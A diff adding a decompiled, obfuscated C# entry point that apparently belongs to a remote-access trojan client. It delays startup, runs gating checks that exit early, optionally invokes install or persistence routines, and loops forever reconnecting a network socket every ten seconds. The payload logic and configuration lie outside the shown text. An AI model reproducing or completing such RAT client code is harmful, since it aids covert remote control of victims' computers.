@@ -1,0 +1,57 @@
+using System;
+using System.Threading;
+
+// Token: 0x02000002 RID: 2
+public class GClass0
+{
+	// Token: 0x06000019 RID: 25 RVA: 0x00002DA8 File Offset: 0x00000FA8
+	public static void Main()
+	{
+		int num;
+		if (int.TryParse(GClass1.string_14, out num) && num > 0)
+		{
+			Thread.Sleep(num * 1000);
+		}
+		if (!GClass1.smethod_0())
+		{
+			Environment.Exit(0);
+		}
+		try
+		{
+			if (!GClass8.smethod_0())
+			{
+				Environment.Exit(0);
+			}
+			if (Convert.ToBoolean(GClass1.string_3))
+			{
+				Class0.smethod_0();
+			}
+			if (Convert.ToBoolean(GClass1.string_12) && GClass7.smethod_0())
+			{
+				GClass7.smethod_1();
+			}
+		}
+		catch (Exception ex)
+		{
+			Console.WriteLine("[Program] Initialization error: " + ex.Message);
+		}
+		try
+		{
+			IL_007C:
+			if (!Network_Class.Boolean_0)
+			{
+				Network_Class.smethod_4();
+				Network_Class.smethod_0();
+			}
+		}
+		catch (Exception ex2)
+		{
+			Console.WriteLine("[Program] Socket error: " + ex2.Message);
+		}
+		Thread.Sleep(10000);
+		goto IL_007C;
+	}
+
+	// Token: 0x04000001 RID: 1
+	public static string string_0;
+}
